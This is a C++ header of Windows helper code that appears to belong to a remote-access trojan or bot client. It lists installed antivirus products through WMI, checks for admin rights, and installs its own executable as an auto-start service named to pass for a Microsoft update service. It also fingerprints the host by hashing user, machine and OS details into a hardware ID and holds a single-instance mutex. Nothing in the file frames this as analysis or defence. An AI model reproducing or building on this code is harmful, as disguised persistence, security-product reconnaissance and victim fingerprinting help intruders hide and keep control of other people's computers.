#pragma once

#include <string>
#include <windows.h>
#include <TlHelp32.h>
#include <taskschd.h>
#include <comutil.h>
#include <iostream>
#include <sstream>
#include <iomanip>
#include <filesystem>
#include <openssl/sha.h>
#include <shlobj_core.h>
#include <Windows.h>
#include <thread>
#include <Wbemidl.h>
#include <wtsapi32.h>

#pragma comment(lib, "comsupp.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "wtsapi32.lib")


extern "C" {
    __declspec(dllimport) void WINAPI RtlGetNtVersionNumbers(
        __out_opt ULONG* pNtMajorVersion,
        __out_opt ULONG* pNtMinorVersion,
        __out_opt ULONG* pNtBuildNumber
    );
};

namespace Helper
{
    static std::string WstringToString(const std::wstring& wstr) {
        if (!wstr.empty()) {
            int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), static_cast<int>(wstr.length()), nullptr, 0, nullptr, nullptr);
            if (size_needed > 0) {
                std::string result(size_needed, 0);
                WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), static_cast<int>(wstr.length()), &result[0], size_needed, nullptr, nullptr);
                return result;
            }
        }
        return "";
    }
    static std::wstring StringToWString(const std::string& str) {
        if (str.empty()) {
            return L"";
        }
        int wstrSize = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), static_cast<int>(str.length()), nullptr, 0);
        if (wstrSize == 0) {
            return L"";
        }
        std::wstring wstr(wstrSize, L'\0');
        MultiByteToWideChar(CP_UTF8, 0, str.c_str(), static_cast<int>(str.length()), &wstr[0], wstrSize);
        return wstr;
    }

    static bool StringToBool(const std::wstring& str) {
        if (str.empty()) {
            return false;
        }
        std::wstring lowercase;
        for (wchar_t c : str) {
            lowercase += std::tolower(c);
        }
        return lowercase == L"true";
    }

    static std::wstring getUserFolder()
    {
        try {
            DWORD sessionId = WTSGetActiveConsoleSessionId();
            if (sessionId != 0xFFFFFFFF) {
                HANDLE hServer = WTS_CURRENT_SERVER_HANDLE;
                HANDLE hUserToken = NULL;
                WCHAR* pUserName = NULL;
                DWORD dwUserNameSize = 0;
                if (WTSQuerySessionInformation(hServer, sessionId, WTSUserName, &pUserName, &dwUserNameSize)) {
                    std::wstring result = pUserName;
                    WTSFreeMemory(pUserName);
                    DWORD drives = GetLogicalDrives();
                    for (char driveLetter = 'A'; driveLetter <= 'Z'; driveLetter++) {
                        if (drives & (1 << (driveLetter - 'A'))) {
                            char rootPath[4];
                            sprintf_s(rootPath, "%c:\\", driveLetter);
                            std::filesystem::path fullPath = std::filesystem::path(rootPath) / std::filesystem::path(L"Users\\" + result);
                            if (std::filesystem::exists(fullPath)) {
                                return fullPath.wstring();
                            }
                        }
                    }
                }
            }
        }
        catch (const std::exception&) {}
        try
        {
            wchar_t findedPath[MAX_PATH];
            if (SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, findedPath) == S_OK) {
                return std::filesystem::path(findedPath).parent_path().wstring();
            }
            else {
                SHGetSpecialFolderPath(NULL, findedPath, CSIDL_PROFILE, FALSE);
                return std::wstring(findedPath);
            }
        }
        catch (const std::exception&) { return L""; }
    }

    static bool IsElevated()
    {
        try
        {
            HANDLE hToken;
            BOOL bIsAdmin = FALSE;
            if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
            {
                TOKEN_ELEVATION elevation;
                DWORD dwSize;
                if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize))
                {
                    bIsAdmin = elevation.TokenIsElevated;
                }
            }
            if (hToken) {
                CloseHandle(hToken);
            }
            return bIsAdmin;

        }
        catch (const std::exception&) { return FALSE; }
    }

    static std::wstring Antivirus()
    {
        try {
            std::vector<std::string> AVs;
            HRESULT hres;
            IWbemLocator* pLoc = nullptr;
            IWbemServices* pSvc = nullptr;

            hres = CoInitialize(NULL);
            hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);

            hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
            if (FAILED(hres)) {
                CoUninitialize();
                return L"N/A";
            }
            hres = pLoc->ConnectServer(_bstr_t(L"ROOT\\SecurityCenter2"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
            if (FAILED(hres)) {
                pLoc->Release();
                CoUninitialize();
                return L"N/A";
            }
            hres = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
            if (FAILED(hres)) {
                pSvc->Release();
                pLoc->Release();
                CoUninitialize();
                return L"N/A";
            }

            IEnumWbemClassObject* pEnumerator = nullptr;
            hres = pSvc->ExecQuery(bstr_t("WQL"), bstr_t("SELECT displayName FROM AntiVirusProduct"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
            if (SUCCEEDED(hres)) {
                IWbemClassObject* pclsObj = nullptr;
                ULONG uReturn = 0;
                while (pEnumerator) {
                    hres = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
                    if (uReturn == 0) {
                        break;
                    }
                    VARIANT vtProp;
                    VariantInit(&vtProp);
                    hres = pclsObj->Get(L"displayName", 0, &vtProp, 0, 0);
                    if (SUCCEEDED(hres)) {
                        std::wstring displayName(vtProp.bstrVal, SysStringLen(vtProp.bstrVal));
                        std::string displayNameUtf8 = WstringToString(displayName);
                        AVs.push_back(displayNameUtf8);
                        VariantClear(&vtProp);
                    }
                    pclsObj->Release();
                }
            }

            pSvc->Release();
            pLoc->Release();
            pEnumerator->Release();
            CoUninitialize();
            if (AVs.empty()) { return L"N/A"; }
            std::ostringstream oss;
            for (size_t i = 0; i < AVs.size(); ++i) {
                oss << AVs[i];
                oss << "; ";
            }
            std::string finalRes = oss.str();
            if (finalRes.size() >= 2) {
                finalRes = finalRes.substr(0, finalRes.size() - 2);
            }
            return StringToWString(finalRes);
        }
        catch (...) {
            return L"N/A";
        }
    }

    class WinService {
    public:
        static bool ExistsWinService(std::wstring Name = L"")
        {
            try
            {
                if (IsElevated())
                {
                    std::wstring Service_Name = L"Microsoft Update Service Machine System Local ";
                    if (!Name.empty()) {
                        Service_Name = Name;
                    }
                    TCHAR findedPath[MAX_PATH];
                    GetModuleFileName(nullptr, findedPath, MAX_PATH);
                    LPCWSTR serviceName = Service_Name.c_str();
                    LPCWSTR payloadPath = findedPath;
                    SC_HANDLE schSCManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
                    if (!schSCManager) {
                        return false;
                    }
                    if (OpenService(schSCManager, serviceName, SERVICE_ALL_ACCESS) != NULL) {
                        CloseServiceHandle(schSCManager);
                        return true;
                    }
                    CloseServiceHandle(schSCManager);
                    return false;
                }
            }
            catch (const std::exception& ex)
            {
                return false;
            }
            return false;
        }

        static bool SetWinService(std::wstring Name = L"")
        {
            try
            {
                if (IsElevated())
                {
                    std::wstring Service_Name = L"Microsoft Update Service Machine System Local ";
                    if (!Name.empty()) {
                        Service_Name = Name;
                    }
                    TCHAR findedPath[MAX_PATH];
                    GetModuleFileName(nullptr, findedPath, MAX_PATH);
                    LPCWSTR serviceName = Service_Name.c_str();
                    LPCWSTR payloadPath = findedPath;
                    SC_HANDLE schSCManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
                    if (!schSCManager) {
                        return false;
                    }
                    if (OpenService(schSCManager, serviceName, SERVICE_ALL_ACCESS) == NULL) {
                        SC_HANDLE schService = CreateService(
                            schSCManager,
                            serviceName,
                            NULL,
                            SERVICE_ALL_ACCESS,
                            SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS,
                            SERVICE_AUTO_START,
                            SERVICE_ERROR_IGNORE,
                            payloadPath,
                            NULL,
                            NULL,
                            NULL,
                            NULL,
                            NULL
                        );
                        if (!schService) {
                            // "Failed to create win service";
                            CloseServiceHandle(schSCManager);
                            return false;
                        }
                        else {
                            // "Successfully installed win service";
                            CloseServiceHandle(schSCManager);
                            return true;
                        }
                    }
                }
            }
            catch (const std::exception& ex)
            {
                return false;
            }
            return false;
        }

        static bool DelWinService(std::wstring Name = L"")
        {
            try
            {
                if (IsElevated())
                {
                    std::wstring Service_Name = L"Microsoft Update Service Machine System Local ";
                    if (!Name.empty()) {
                        Service_Name = Name;
                    }
                    LPCWSTR serviceName = Service_Name.c_str();
                    SC_HANDLE schSCManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
                    if (!schSCManager) {
                        return false;
                    }
                    SC_HANDLE svcHandle = OpenService(schSCManager, serviceName, DELETE);
                    if (svcHandle) {
                        if (DeleteService(svcHandle)) {
                            // "Successfully deleted win service";
                            CloseServiceHandle(svcHandle);
                            return true;
                        }
                        else {
                            // "Unable to delete win service";
                            CloseServiceHandle(svcHandle);
                            return false;
                        }
                    }
                    else {
                        return false;
                    }
                }
                return false;
            }
            catch (const std::exception& ex)
            {
                return false;
            }
        }

    };
    
    class Mutex {
    private:
        static HANDLE currentApp;
    public:
        static bool CreateTheMutex();

        static void CloseTheMutex();
    };

    class Hwid {
    private:
        static std::wstring GetProcessorCount() {
            try {
                unsigned int count = std::thread::hardware_concurrency();
                return std::to_wstring(count);
            }
            catch (const std::exception&) {
                return L"0";
            }
        }
        static std::wstring GetmyUserName() {
            try
            {
                DWORD sessionId = WTSGetActiveConsoleSessionId();
                if (sessionId != 0xFFFFFFFF) {
                    HANDLE hServer = WTS_CURRENT_SERVER_HANDLE;
                    HANDLE hUserToken = NULL;
                    WCHAR* pUserName = NULL;
                    DWORD dwUserNameSize = 0;
                    if (WTSQuerySessionInformation(hServer, sessionId, WTSUserName, &pUserName, &dwUserNameSize)) {
                        std::wstring result = pUserName;
                        WTSFreeMemory(pUserName);
                        return result;
                    }
                }
                wchar_t path[MAX_PATH];
                SHGetSpecialFolderPath(NULL, path, CSIDL_PROFILE, FALSE);
                std::wstring wstr(path);
                size_t lastBackslashPos = wstr.rfind('\\');
                if (lastBackslashPos != std::string::npos) {
                    return wstr.substr(lastBackslashPos + 1);
                }
                return L"";
            }
            catch (const std::exception&)
            {
                return L"";
            }
        }
        static std::wstring GetMachineName() {
            TCHAR computerName[MAX_COMPUTERNAME_LENGTH + 1];
            DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
            if (GetComputerName(computerName, &size)) {
                return std::wstring(computerName);
            }
            return L"";
        }
        static std::wstring GetOSVersion() {
            try {
                ULONG MajorVersion = 0;
                ULONG MinorVersion = 0;
                ULONG BuildNumber = 0;
                RtlGetNtVersionNumbers(&MajorVersion, &MinorVersion, &BuildNumber);
                std::wstringstream result;
                result << L"Microsoft Windows NT " << MajorVersion << L'.' << MinorVersion << L'.' << (BuildNumber & ~0xF0000000);
                return result.str();
            }
            catch (...) {
                return L"";
            }
        }
        static std::wstring GetPathRoot() {
            wchar_t systemPath[MAX_PATH];
            if (SHGetSpecialFolderPath(NULL, systemPath, CSIDL_WINDOWS, FALSE)) {
                wchar_t drive[4];
                wmemcpy(drive, systemPath, 3);
                drive[3] = L'\0';
                return std::wstring(drive);
            }
            return L"";
        }

        static std::wstring ComputeHash(std::wstring strToHash)
        {
            std::string temp = WstringToString(strToHash);
            unsigned char hash[SHA256_DIGEST_LENGTH];
            SHA256((const unsigned char*)temp.c_str(), temp.length(), hash);
            std::stringstream ss;
            for (int i = 0; i < SHA256_DIGEST_LENGTH; ++i) {
                ss << std::hex << std::setw(2) << std::setfill('0') << (int)hash[i];
            }
            return StringToWString(ss.str());
        }

    public:
        static std::wstring HWID()
        {
            try {
                return ComputeHash(GetProcessorCount() + GetmyUserName() + GetMachineName() + GetOSVersion() + GetPathRoot());
            }
            catch (...) {
                return L"Err HWID";
            }
        }
    };



}